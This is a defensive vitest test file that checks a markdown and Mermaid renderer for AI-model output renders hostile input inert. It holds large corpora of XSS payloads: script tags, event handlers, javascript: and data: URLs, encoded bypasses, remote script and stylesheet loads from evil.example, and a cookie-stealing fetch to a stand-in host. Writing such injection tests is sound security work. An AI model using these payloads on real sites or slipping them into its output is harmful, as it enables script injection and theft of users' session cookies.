/**
 * Markdown / SVG injection tests.
 *
 * The model's text (and anything an attacker can get into it through a prompt, a retrieved
 * judgment or a web page) is rendered with `renderMarkdown` and put on the page with
 * `innerHTML`. These tests feed a large payload corpus through the renderer, parse the result
 * into a real DOM and assert what an attacker would need is absent: no executable element, no
 * event-handler attribute, no navigable URL except http(s)/mailto behind a `data-href`, no
 * remote resource, and nothing outside the tags the renderer itself produces.
 */

import { describe, expect, it } from "vitest"
import { renderMarkdown } from "./markdown-lite"

/** Elements the renderer is allowed to emit. Anything else in the output is an injection. */
const ALLOWED_TAGS = new Set([
  "a", "blockquote", "br", "button", "code", "del", "details", "div", "em", "h1", "h2", "h3", "h4", "h5", "h6",
  "hr", "li", "ol", "p", "pre", "span", "strong", "summary", "table", "tbody", "td", "th", "thead", "tr", "ul",
  // Mermaid diagram output
  "svg", "g", "path", "rect", "circle", "ellipse", "line", "polyline", "polygon", "text", "tspan", "defs", "marker",
  "title", "desc", "style", "foreignobject",
])
const FORBIDDEN_TAGS = ["script", "iframe", "object", "embed", "img", "video", "audio", "source", "link", "meta", "base", "form", "input", "textarea", "select", "frame", "frameset", "applet", "math", "template", "noscript", "foreignobject", "animate", "set", "use", "image"]
const ALLOWED_ATTRS = new Set(["class", "href", "data-href", "title", "type", "aria-label", "aria-hidden", "role", "tabindex", "start", "value", "align", "style", "viewbox", "d", "x", "y", "x1", "x2", "y1", "y2", "cx", "cy", "r", "rx", "ry", "width", "height", "fill", "stroke", "stroke-width", "stroke-dasharray", "stroke-linecap", "stroke-linejoin", "points", "transform", "text-anchor", "dominant-baseline", "font-size", "font-weight", "font-family", "marker-end", "marker-start", "id", "xmlns", "opacity", "refx", "refy", "markerwidth", "markerheight", "orient", "markerunits", "preserveaspectratio", "fill-opacity", "stroke-opacity", "stroke-miterlimit", "font-style", "letter-spacing", "colspan", "rowspan", "scope", "open", "dy", "dx"])

function dom(html: string): HTMLElement {
  const root = document.createElement("div")
  root.innerHTML = html
  return root
}

/** The checks every rendered fragment must pass, however hostile the input was. */
function assertInert(html: string, input: string): void {
  const root = dom(html)
  const where = `input: ${JSON.stringify(input.slice(0, 120))}\noutput: ${html.slice(0, 400)}`

  for (const tag of FORBIDDEN_TAGS) {
    expect(root.querySelector(tag), `<${tag}> present\n${where}`).toBeNull()
  }
  for (const el of Array.from(root.querySelectorAll("*"))) {
    const name = el.tagName.toLowerCase()
    expect(ALLOWED_TAGS.has(name), `unexpected <${name}>\n${where}`).toBe(true)
    for (const attr of Array.from(el.attributes)) {
      const a = attr.name.toLowerCase()
      expect(a.startsWith("on"), `event handler ${a}\n${where}`).toBe(false)
      expect(ALLOWED_ATTRS.has(a), `unexpected attribute ${a} on <${name}>\n${where}`).toBe(true)
      expect(/javascript:|vbscript:|data:text\/html|expression\(/i.test(attr.value.replace(/[\s\u0000-\u001f]/g, "")), `script URL in ${a}\n${where}`).toBe(false)
    }
  }
  // Links never navigate by themselves: href is "#", the target lives in data-href.
  for (const a of Array.from(root.querySelectorAll("a"))) {
    expect(a.getAttribute("href"), where).toBe("#")
    const dh = a.getAttribute("data-href")
    expect(dh === null || /^(?:https?:\/\/|mailto:)/i.test(dh), `data-href ${dh}\n${where}`).toBe(true)
  }
  // No remote loads from inline styles either.
  for (const el of Array.from(root.querySelectorAll("[style]"))) {
    expect(/url\s*\(|@import|expression|javascript:/i.test(el.getAttribute("style") ?? ""), `style on <${el.tagName}>\n${where}`).toBe(false)
  }
  for (const s of Array.from(root.querySelectorAll("style"))) {
    expect(/@import|url\s*\(|expression|javascript:/i.test(s.textContent ?? ""), `<style> content\n${where}`).toBe(false)
  }
}

const SCRIPT_AND_TAG_PAYLOADS = [
  "<script>alert(1)</script>",
  "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "<img src=x onerror=alert(1)>",
  "<img src=\"x\" onerror=\"fetch('//evil.example?c='+document.cookie)\">",
  "<IMG SRC=javascript:alert(1)>",
  "<svg onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
  "<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>",
  "<iframe src=\"javascript:alert(1)\"></iframe>",
  "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
  "<object data=\"javascript:alert(1)\"></object>",
  "<embed src=\"//evil.example/x.swf\">",
  "<body onload=alert(1)>",
  "<input autofocus onfocus=alert(1)>",
  "<details open ontoggle=alert(1)>",
  "<video><source onerror=alert(1)></video>",
  "<audio src onerror=alert(1)>",
  "<math><mtext></mtext><mglyph><style></style><img src onerror=alert(1)>",
  "<form action=\"//evil.example\"><input name=password></form>",
  "<meta http-equiv=\"refresh\" content=\"0;url=//evil.example\">",
  "<link rel=stylesheet href=//evil.example/x.css>",
  "<base href=\"//evil.example/\">",
  "<style>@import url(//evil.example/x.css);</style>",
  "<div style=\"background:url(javascript:alert(1))\">x</div>",
  "<a href=\"javascript:alert(1)\">click</a>",
  "<a href=\"&#106;avascript:alert(1)\">click</a>",
  "<a href=\" jav\tascript:alert(1)\">click</a>",
  "<<script>alert(1)//<</script>",
  "<!--<script>alert(1)</script>-->",
  "<![CDATA[<script>alert(1)</script>]]>",
  "<noscript><p title=\"</noscript><img src onerror=alert(1)>\">",
  "<template><script>alert(1)</script></template>",
  "\u003cscript\u003ealert(1)\u003c/script\u003e",
  "＜script＞alert(1)＜/script＞",
  "<scr\u0000ipt>alert(1)</scr\u0000ipt>",
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "&#60;script&#62;alert(1)&#60;/script&#62;",
]

const MARKDOWN_LINK_PAYLOADS = [
  "[x](javascript:alert(1))",
  "[x](JaVaScRiPt:alert(1))",
  "[x]( javascript:alert(1))",
  "[x](java\tscript:alert(1))",
  "[x](&#106;avascript:alert(1))",
  "[x](data:text/html,<script>alert(1)</script>)",
  "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "[x](vbscript:msgbox(1))",
  "[x](file:///etc/passwd)",
  "[x](//evil.example/path)",
  "[x](\\\\evil.example\\share)",
  "[x](https://ok.example/\"onmouseover=\"alert(1))",
  "[x](https://ok.example/' onmouseover='alert(1))",
  "[x](https://ok.example/`onmouseover=`alert(1))",
  "[x](https://ok.example/><script>alert(1)</script>)",
  "[<img src=x onerror=alert(1)>](https://ok.example)",
  "[<script>alert(1)</script>](https://ok.example)",
  "[\"onmouseover=\"alert(1)](https://ok.example)",
  "[x](mailto:a@b.sg?body=<script>alert(1)</script>)",
  "![x](https://evil.example/track.png)",
  "![x](javascript:alert(1))",
  "![<img src=x onerror=alert(1)>](https://evil.example/a.png)",
  "![](https://evil.example/pixel.gif)",
  "[ref]: javascript:alert(1)\n[x][ref]",
  "<https://evil.example/\"onmouseover=\"alert(1)>",
  "https://evil.example/\"onmouseover=\"alert(1)",
  "https://evil.example/<script>alert(1)</script>",
  "http://localhost:3000/\"><script>alert(1)</script>",
  "127.0.0.1:80/\" onclick=\"alert(1)",
  "[SSO](https://sso.agc.gov.sg.evil.example/Act/X)",
  "[SSO](https://sso.agc.gov.sg/Act/X\"onclick=\"alert(1))",
]

const STRUCTURE_PAYLOADS = [
  "# <script>alert(1)</script>",
  "## <img src=x onerror=alert(1)>",
  "> <script>alert(1)</script>",
  "- <img src=x onerror=alert(1)>\n- ok",
  "1. <iframe src=//evil.example></iframe>",
  "| A | B |\n| --- | --- |\n| <script>alert(1)</script> | <img src=x onerror=alert(1)> |",
  "| <img src=x onerror=alert(1)> | B |\n| --- | --- |\n| a | b |",
  "| A |\n| --- |\n| [x](javascript:alert(1)) |",
  "| A | B |\n| :--- | ---: |\n| `<script>` | **<b onmouseover=alert(1)>x</b>** |",
  "**<script>alert(1)</script>**",
  "*<img src=x onerror=alert(1)>*",
  "~~<svg onload=alert(1)>~~",
  "`<script>alert(1)</script>`",
  "```\n</pre><script>alert(1)</script>\n```",
  "```\"><script>alert(1)</script>\ncode\n```",
  "```js onclick=alert(1)\ncode\n```",
  "```<img src=x onerror=alert(1)>\ncode\n```",
  "~~~html\n<script>alert(1)</script>\n~~~",
  "    <script>alert(1)</script>",
  "Term\n: <script>alert(1)</script>",
  "---\n<script>alert(1)</script>",
  "<div>\n<script>alert(1)</script>\n</div>",
  "line one<br><img src=x onerror=alert(1)>\nline two",
  "&nbsp;<script>alert(1)</script>",
  "\\<script>alert(1)\\</script>",
  "**bold <b>**</b><script>alert(1)</script>",
  "_a_ <script>alert(1)</script> *b*",
  "* * *\n<script>alert(1)</script>",
]

const MERMAID_PAYLOADS = [
  "graph TD\n  A[<script>alert(1)</script>] --> B",
  "graph TD\n  A[\"<img src=x onerror=alert(1)>\"] --> B",
  "graph TD\n  A -->|<svg onload=alert(1)>| B",
  "graph TD\n  A[x\" onmouseover=\"alert(1)] --> B",
  "graph TD\n  A[x' onclick='alert(1)] --> B",
  "graph LR\n  A(</text><script>alert(1)</script>) --> B",
  "graph TD\n  A[</text></svg><script>alert(1)</script>] --> B",
  "graph TD\n  click A \"javascript:alert(1)\"",
  "graph TD\n  click A call alert(1)",
  "graph TD\n  A --> B\n  style A fill:url(javascript:alert(1))",
  "graph TD\n  classDef x fill:#fff;background:url(//evil.example/x.png)\n  A:::x --> B",
  "graph TD\n  subgraph \"<script>alert(1)</script>\"\n    A --> B\n  end",
  "sequenceDiagram\n  participant A as <script>alert(1)</script>\n  A->>B: <img src=x onerror=alert(1)>",
  "sequenceDiagram\n  A->>B: \"onmouseover=\"alert(1)",
  "flowchart TD\n  A[\"&lt;script&gt;alert(1)&lt;/script&gt;\"] --> B",
  "pie title <script>alert(1)</script>\n  \"a\" : 1",
  "gantt\n  title <img src=x onerror=alert(1)>\n  section s\n  t :a1, 2026-01-01, 1d",
  "%%{init: {\"securityLevel\":\"loose\"}}%%\ngraph TD\n  A --> B",
  "graph TD\n  A[<a href=\"javascript:alert(1)\">x</a>] --> B",
  "graph TD\n  A[<foreignObject><iframe src=//evil.example></iframe></foreignObject>] --> B",
]

function fenceMermaid(src: string): string {
  return "```mermaid\n" + src + "\n```"
}

describe("markdown injection: raw HTML and scripts are inert text", () => {
  for (const payload of SCRIPT_AND_TAG_PAYLOADS) {
    it(`neutralises ${JSON.stringify(payload.slice(0, 50))}`, () => {
      assertInert(renderMarkdown(payload), payload)
      assertInert(renderMarkdown(`before ${payload} after`), payload)
      assertInert(renderMarkdown(payload, { hardBreaks: true }), payload)
    })
  }

  it("shows the markup as visible text rather than dropping it silently", () => {
    const html = renderMarkdown("<script>alert(1)</script>")
    expect(html).toContain("&lt;script&gt;")
    expect(dom(html).textContent).toContain("<script>alert(1)</script>")
  })
})

describe("markdown injection: links and images", () => {
  for (const payload of MARKDOWN_LINK_PAYLOADS) {
    it(`keeps ${JSON.stringify(payload.slice(0, 50))} harmless`, () => {
      assertInert(renderMarkdown(payload), payload)
      assertInert(renderMarkdown(`see ${payload} here`), payload)
    })
  }

  it("never turns a non-http(s) scheme into a link", () => {
    for (const bad of ["javascript:alert(1)", "JAVASCRIPT:alert(1)", "data:text/html,x", "vbscript:x", "file:///etc/passwd", "ftp://x.example", "blob:https://x.example/1"]) {
      const root = dom(renderMarkdown(`[label](${bad})`))
      expect(root.querySelector("a"), bad).toBeNull()
      expect(root.textContent).toContain("label")
    }
  })

  it("accepts http, https and mailto links, with the target only in data-href", () => {
    for (const good of ["https://example.sg/a?b=1", "http://example.sg", "mailto:a@b.sg"]) {
      const a = dom(renderMarkdown(`[label](${good})`)).querySelector("a")!
      expect(a.getAttribute("href")).toBe("#")
      expect(a.getAttribute("data-href")).toBe(good)
    }
  })

  it("never renders an image tag, so nothing can be fetched or beaconed", () => {
    for (const img of ["![a](https://evil.example/x.png)", "![](https://evil.example/x.gif)", "<img src=https://evil.example/x.png>", "![a][r]\n\n[r]: https://evil.example/x.png"]) {
      const html = renderMarkdown(img)
      expect(dom(html).querySelector("img,image,source,video,audio"), img).toBeNull()
      // "src=" may appear as visible (escaped) text, but never as an attribute on any element.
      expect(dom(html).querySelector("[src],[srcset],[srcdoc],[poster],[background]"), img).toBeNull()
    }
  })

  it("does not let quotes in a URL break out of the attribute", () => {
    const html = renderMarkdown("[x](https://ok.example/\"onmouseover=\"alert(1))")
    const root = dom(html)
    for (const el of Array.from(root.querySelectorAll("*"))) {
      expect(Array.from(el.attributes).some((a) => a.name.startsWith("on"))).toBe(false)
    }
  })

  it("only gives the SSO styling to a real sso.agc.gov.sg https URL", () => {
    const real = dom(renderMarkdown("[SSO](https://sso.agc.gov.sg/Act/CoA1967?ProvIds=pr19-)")).querySelector("a")!
    expect(real.className).toContain("dsm-sso-link")
    for (const fake of ["https://sso.agc.gov.sg.evil.example/Act/X", "http://sso.agc.gov.sg/Act/X", "https://evil.example/?https://sso.agc.gov.sg/"]) {
      const a = dom(renderMarkdown(`[SSO](${fake})`)).querySelector("a")
      expect(a?.className ?? "", fake).not.toContain("dsm-sso-link")
    }
  })
})

describe("markdown injection: structure, tables and code", () => {
  for (const payload of STRUCTURE_PAYLOADS) {
    it(`keeps ${JSON.stringify(payload.slice(0, 50))} harmless`, () => {
      assertInert(renderMarkdown(payload), payload)
    })
  }

  it("keeps a closing </pre> inside a code block from ending it", () => {
    const root = dom(renderMarkdown("```\n</pre><script>alert(1)</script>\n```"))
    expect(root.querySelector("script")).toBeNull()
    expect(root.querySelector("pre")?.textContent).toContain("</pre><script>alert(1)</script>")
  })

  it("escapes the code fence info string", () => {
    const root = dom(renderMarkdown("```\"><img src=x onerror=alert(1)>\nx\n```"))
    expect(root.querySelector("img")).toBeNull()
  })
})

describe("markdown injection: mermaid diagrams", () => {
  for (const payload of MERMAID_PAYLOADS) {
    it(`keeps diagram ${JSON.stringify(payload.slice(0, 50))} harmless`, () => {
      assertInert(renderMarkdown(fenceMermaid(payload)), payload)
    })
  }

  it("never lets diagram text become markup", () => {
    const root = dom(renderMarkdown(fenceMermaid("graph TD\n  A[<script>alert(1)</script>] --> B")))
    expect(root.querySelector("script")).toBeNull()
  })

  it("keeps the diagram source copyable as escaped text", () => {
    const root = dom(renderMarkdown(fenceMermaid("graph TD\n  A[<b>x</b>] --> B")))
    const src = root.querySelector(".dsm-mermaid-source pre")
    expect(src?.textContent ?? "").toContain("<b>x</b>")
    expect(src?.querySelector("b")).toBeNull()
  })
})

describe("markdown injection: robustness", () => {
  it("renders a combination of every payload without ever producing an executable node", () => {
    const all = [...SCRIPT_AND_TAG_PAYLOADS, ...MARKDOWN_LINK_PAYLOADS, ...STRUCTURE_PAYLOADS].join("\n\n")
    assertInert(renderMarkdown(all), "all payloads together")
  })

  it("survives unbalanced and nested markers", () => {
    for (const s of ["**".repeat(500), "[".repeat(500), "](".repeat(500), "`".repeat(501), "_".repeat(500), "<".repeat(500), "| a ".repeat(300), "> ".repeat(300) + "x", "- ".repeat(300) + "x", "[a](".repeat(200) + "https://x.example" + ")".repeat(200)]) {
      assertInert(renderMarkdown(s), s)
    }
  })

  it("does not take pathological input more than a moment (no regex blow-up)", () => {
    const nasty = ["*a".repeat(5000), "[a](" + "b".repeat(20000), "`a".repeat(5000), "__a".repeat(5000), "https://" + "a.".repeat(5000), "![" + "x".repeat(20000)]
    for (const s of nasty) {
      const t = performance.now()
      renderMarkdown(s)
      expect(performance.now() - t, s.slice(0, 20)).toBeLessThan(1500)
    }
  })

  it("does not treat the renderer's internal placeholders as markup when the model sends them", () => {
    const html = renderMarkdown("\uE0000\uE001 and \uE0001\uE001 `code` [l](https://ok.example)")
    assertInert(html, "private-use sentinels")
    expect(html).not.toMatch(/undefined/)
  })

  it("handles control characters, null bytes and bidi overrides", () => {
    for (const s of ["a\u0000b<script>alert(1)</script>", "\u202e<script>alert(1)</script>", "\u200b<\u200bscript>alert(1)</script>", "\r\n<script>\r\nalert(1)\r\n</script>"]) {
      assertInert(renderMarkdown(s), s)
    }
  })
})
